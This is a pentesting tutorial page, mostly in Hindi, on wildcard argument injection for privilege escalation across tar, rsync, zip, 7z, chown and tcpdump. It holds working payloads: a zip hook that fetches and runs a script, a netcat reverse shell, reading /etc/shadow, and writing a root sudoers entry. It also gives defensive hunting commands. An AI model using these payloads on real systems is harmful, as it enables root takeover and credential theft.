# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** तब होता है जब कोई privileged script `tar`, `chown`, `rsync`, `zip`, `7z`, … जैसे Unix binary को unquoted wildcard जैसे `*` के साथ चलाता है।  
> चूँकि shell binary को चलाने से **पहले** wildcard का विस्तार करता है, इसलिए working directory में files बना सकने वाला attacker ऐसे filenames बना सकता है जो `-` से शुरू हों। इससे वे **data के बजाय options** के रूप में समझे जाते हैं और मनमाने flags या यहाँ तक कि commands भी चुपके से जोड़े जा सकते हैं।<sup>[[6]](#references)</sup>
> इस पेज में 2023-2025 के सबसे उपयोगी primitives, हालिया research और आधुनिक detections शामिल हैं।

## chown / chmod

Wildcard से expand होने वाले option-जैसे filename का दुरुपयोग करके `--reference` flag के ज़रिए किसी reference file का **owner/group या permission bits कॉपी** किया जा सकता है।<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

जब root बाद में कुछ इस तरह execute करता है:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

विस्तारित `--reference=.drf.php` स्पष्ट owner/mode को ओवरराइड करता है, जिससे matching files को `.drf.php` से metadata मिलता है (और ऊपर दिए गए setup में, वे attacker के लिए writable हो जाती हैं)।<sup>[[6]](#references)</sup>

पूरे privileged helper की समीक्षा करें, केवल उसकी `chown` line की नहीं। Ownership बदलने से set-user-ID या set-group-ID bits हट सकते हैं; [POSIX के अनुसार privileged case का व्यवहार implementation-defined है](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html)। उसी job में बाद का `chmod`, पहले चुनी गई files पर वे bits फिर से लगा सकता है, जिससे नतीजा बदल सकता है। इसे executable privilege path मानने से पहले असल command order, writable glob directory, प्रभावित file और link का व्यवहार, परिणामस्वरूप owner और mode, और set-user-ID को mount द्वारा मान्य किए जाने की पुष्टि करें। अगर helper पढ़ा नहीं जा सकता, तो ये चरण अज्ञात रहते हैं।

*PoC और tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack)।<sup>[[7]](#references)</sup>
विवरण के लिए classic DefenseCode paper भी देखें।<sup>[[6]](#references)</sup>

---

## privileged script में GNU `cp`

ऐसी root-run script की समीक्षा करें जो caller द्वारा चुनी गई working directory से bare glob का उपयोग करके copy करती हो, जैसे `cp .version * /etc/app/staged/`, और जहाँ कम privilege वाला user filenames बना सकता हो। GNU `cp`, `*` से expand हुए dash से शुरू होने वाले filename को option की तरह parse कर सकता है। इसका `--preserve=mode` option नई copy पर source के mode bits बनाए रख सकता है, और `--target-directory` copy की destination बदल सकता है। इन दोनों में से किसी भी प्रभाव की पुष्टि के लिए script की सटीक branch, destination की स्थिति, प्रभावी privilege, filesystem policy और GNU `cp` का व्यवहार जाँचना ज़रूरी है; केवल sudo rule या script का text escalation साबित नहीं करता। Operands के आगे `./` लगाने या `--` से option parsing समाप्त करने पर GNU `cp` में dash से शुरू होने वाले filename की यह व्याख्या रुक जाती है ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp` manual](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html))।

---

## tar

### GNU tar

GNU tar के **checkpoint** feature और checkpoint actions का दुरुपयोग करके मनमाने commands चलाएँ।<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

जब root उदाहरण के लिए `tar -czf /root/backup.tgz *` चलाता है, तो `shell.sh` root के रूप में execute होती है।<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override संबंधी सावधानी

हाल के macOS पर default `tar` (`libarchive` पर आधारित) GNU tar का `--checkpoint` interface प्रदान *नहीं* करता, लेकिन bsdtar किसी external compressor को चुनने के लिए **--use-compress-program** को document करता है।<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
जब कोई privileged script `tar -cf backup.tar *` चलाती है, तो यह victim के `PATH` के ज़रिए `sh` चुनती है और bsdtar उसे compressor के रूप में शुरू करता है।<sup>[[11]](#references)</sup> यह option injection साबित करता है, लेकिन अपने-आप में arbitrary-command चलाने का भरोसेमंद तरीका नहीं है: wildcard से बना filename `/` नहीं रख सकता, और bsdtar archive data देता है, न कि attacker द्वारा चुनी गई shell command। Code execution के लिए `PATH` के ज़रिए resolve होने वाला नियंत्रित executable या कोई दूसरा argument channel भी ज़रूरी है, जिससे किसी उपयोगी program का नाम दिया जा सके।

---

## rsync

`rsync` आपको `-e` और `--rsync-path` जैसे command-line flags के ज़रिए remote shell या remote binary को override करने देता है।<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

अगर root बाद में `rsync -az * backup:/srv/` से directory archive करता है, तो injected flag remote-shell mechanism के ज़रिए shell चला सकता है।<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

भले ही privileged script option parsing रोकने के लिए wildcard के आगे `--` जोड़ता हो, 7-Zip CLI filename के आगे `@` लगाकर **file list files** स्वीकार करता है। इसे symlink के साथ मिलाकर *arbitrary files exfiltrate* किए जा सकते हैं।<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

यदि root कुछ इस तरह चलाता है:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip `root.txt` (→ `/etc/shadow`) को फ़ाइल सूची के रूप में पढ़ने की कोशिश करेगा और रुक जाएगा, **तथा सामग्री को stderr पर प्रिंट करेगा**।<sup>[[13]](#references)</sup>

यह `-- *` के बावजूद काम करता है, क्योंकि 7-Zip CLI positional inputs के रूप में सामान्य filenames और `@listfiles` दोनों को स्पष्ट रूप से स्वीकार करता है, इसलिए `@root.txt` जैसा शाब्दिक filename अब भी विशेष रूप से माना जाता है।<sup>[[13]](#references)</sup>

---

## zip

जब कोई एप्लिकेशन user-controlled filenames को `zip` में पास करता है (या तो wildcard के ज़रिए या `--` के बिना नामों की सूची बनाकर), तो दो बेहद व्यावहारिक primitives उपलब्ध होते हैं।<sup>[[2]](#references)[[3]](#references)</sup>

- टेस्ट hook के ज़रिए RCE: `-T` “टेस्ट आर्काइव” सक्षम करता है और `-TT <cmd>` tester को किसी arbitrary program से बदल देता है (लंबा रूप: `--unzip-command <cmd>`)। अगर आप `-` से शुरू होने वाले filenames inject कर सकते हैं, तो flags को अलग-अलग filenames में बाँटें, ताकि short-options parsing काम करे।<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

नोट्स
- `'-T -TT <cmd>'` जैसे एकल filename का उपयोग न करें — short options को प्रति character parse किया जाता है और यह विफल हो जाएगा। दिखाए अनुसार अलग-अलग tokens का उपयोग करें।<sup>[[3]](#references)</sup>
- यदि app filenames से slashes हटा देता है, तो bare host/IP से fetch करें (default path `/index.html`) और `-O` से locally save करें, फिर execute करें।<sup>[[3]](#references)</sup>
- यह समझने के लिए कि आपके tokens कैसे consume हो रहे हैं, `-sc` (processed argv दिखाएँ) या `-h2` (अधिक help) से parsing debug कर सकते हैं।<sup>[[3]](#references)</sup>

उदाहरण (zip 3.0 पर local behavior)।<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: यदि web layer `zip` stdout/stderr को echo करता है (naive wrappers में आम), तो `--help` जैसे injected flags या गलत options से होने वाली विफलताएँ HTTP response में दिखेंगी। इससे command-line injection की पुष्टि होती है और payload tuning में मदद मिलती है।<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

जब कोई privileged wrapper writable directory को wildcard के साथ expand करता है, तो इन documented option hooks को जाँचना उपयोगी है।<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | दुरुपयोग के लिए flag | प्रभाव |
| --- | --- | --- |
| `flock` | `-c <cmd>` | shell को command string पास करता है |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push के लिए SSH के बजाय `<cmd>` का उपयोग करता है |
| `scp`   | `-S <program>` | वैकल्पिक SSH-compatible connection program का उपयोग करता है |

ये primitives, *tar/rsync/zip* जैसे पारंपरिक तरीकों से आगे भी उपयोगी जाँच हैं।

---

## Vulnerable wrappers और jobs की तलाश

हाल के case studies और detection guidance से पता चलता है कि wildcard/argv injection अब सिर्फ **cron + tar** की समस्या नहीं है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> यही bug class बार-बार इनमें दिखाई देती है:

- web features, जो attacker-controlled upload directories से "सब कुछ zip/tar के रूप में download" करते हैं
- vendor/appliance के debug shells, जो attacker-controlled filename/filter fields वाला **tcpdump** wrapper उपलब्ध कराते हैं
- backup या rotation jobs, जो writable directories पर `tar`, `rsync`, `7z`, `zip`, `chown` या `chmod` चलाते हैं

उपयोगी triage commands (`pspy` invocation में इसके documented process/file-event और interval flags का उपयोग किया गया है)।<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

त्वरित heuristics:

- `-- *` कई GNU tools के लिए अच्छा fix है, लेकिन `7z`/`7za` के लिए **नहीं**, क्योंकि `@listfiles` को अलग से parse किया जाता है।<sup>[[13]](#references)</sup>
- `zip` के लिए ऐसे wrappers खोजें जो user-controlled filenames को सीधे enumerate करते हैं; short-option splitting (`-T` + `-TT <cmd>`) shell glob के बिना भी काम करता है।<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump` के लिए, उन wrappers पर विशेष ध्यान दें जो आपको **output file names**, **rotation settings** या **capture-file replay** arguments नियंत्रित करने देते हैं।<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): wrappers में argv injection के ज़रिए RCE

जब कोई restricted shell या vendor wrapper, strict quoting/validation के बिना user-controlled fields (जैसे "file name" parameter) को जोड़कर `tcpdump` command line बनाता है, तो आप अतिरिक्त `tcpdump` flags छिपाकर भेज सकते हैं। `-G` (time-based rotation), `-W` (फाइलों की संख्या सीमित करना) और `-z <cmd>` (post-rotate command) का संयोजन, `tcpdump` चलाने वाले user (अक्सर appliances पर root) के रूप में arbitrary command execution देता है।<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

पूर्वापेक्षाएँ:

- आप `tcpdump` को दिए गए `argv` को प्रभावित कर सकते हैं (जैसे, `/debug/tcpdump --filter=... --file-name=<HERE>` जैसे wrapper के ज़रिए)।<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper, file name field में spaces या `-` से शुरू होने वाले tokens को sanitize नहीं करता।<sup>[[4]](#references)</sup>

पारंपरिक PoC (एक writable path से reverse shell script चलाता है)।<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

विवरण:

- `-G 1` हर सेकंड rotate करता है, और `-W 1` एक rotated file के बाद रुक जाता है; rotation से पहले capture को matching packet मिलना ज़रूरी है।<sup>[[18]](#references)</sup>
- `-z <cmd>` हर rotation के बाद post-rotate command एक बार चलाता है और बंद savefile path को argument के रूप में पास करता है; सुनिश्चित करें कि script/interpreter का argument handling आपके payload से मेल खाता हो।<sup>[[18]](#references)</sup>

बिना removable media वाले विकल्प:

- अगर आपके पास files लिखने का कोई अन्य primitive है (उदाहरण के लिए, एक अलग command wrapper जो output redirection की अनुमति देता हो), तो अपनी script को किसी ज्ञात path पर रखें और `-z /path/script.sh` trigger करें; ज़रूरत पड़ने पर script से `/bin/sh` चलवाएँ।<sup>[[18]](#references)</sup>
- अगर कोई vendor wrapper आपको rotated path चुनने देता है, तो उस path control का audit केवल ऐसे post-rotate command के साथ करें जो उसके savefile argument को interpret करता हो; केवल path control से file contents execute नहीं होते।<sup>[[18]](#references)</sup>

---

## sudoers: wildcards/additional args के साथ tcpdump → arbitrary write/read और root

sudoers anti-pattern का उदाहरण:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

यह नियम tcpdump के documented parser में कई विकल्प उपलब्ध छोड़ता है:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob और permissive patterns केवल पहले `-w` argument को सीमित करते हैं। `tcpdump` कई `-w` options स्वीकार करता है; आख़िरी वाला प्रभावी होता है।<sup>[[3]](#references)[[18]](#references)</sup>
- यह नियम अन्य options को सीमित नहीं करता, इसलिए `-Z`, `-r`, `-V` आदि की अनुमति है।<sup>[[3]](#references)[[18]](#references)</sup>

प्रासंगिक primitives नीचे documented हैं।<sup>[[3]](#references)[[18]](#references)</sup>
- दूसरे `-w` से destination path बदलें (पहला केवल sudoers की शर्त पूरी करता है)।<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- constrained tree से बाहर निकलने के लिए पहले `-w` में Path traversal।<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-Z root` से output का ownership force करें (कहीं भी root-owned files बनाता है)।<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-r` के ज़रिए crafted PCAP को replay करके मनमाना content लिखना (उदाहरण के लिए, sudoers में एक line जोड़ना)।<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>ऐसा PCAP बनाएँ जिसमें exact ASCII payload हो और उसे root के रूप में लिखें</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- `-V <file>` के साथ arbitrary file read/secret leak (यह savefiles की सूची को पढ़ता है)। Error diagnostics अक्सर lines को echo करते हैं, जिससे content leak होता है।<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection से RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard Injection के ज़रिए Potential Shell का पता चला](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [भविष्य में वापसी: Unix Wildcards का बेकाबू इस्तेमाल (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` कमांड का उपयोग](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` कमांड का उपयोग](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) मैनुअल](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) मैनुअल](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip command line syntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) मैनुअल](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git configuration दस्तावेज़](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` मैनुअल](https://man.openbsd.org/scp)
- [18] [tcpdump(8) मैनुअल](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
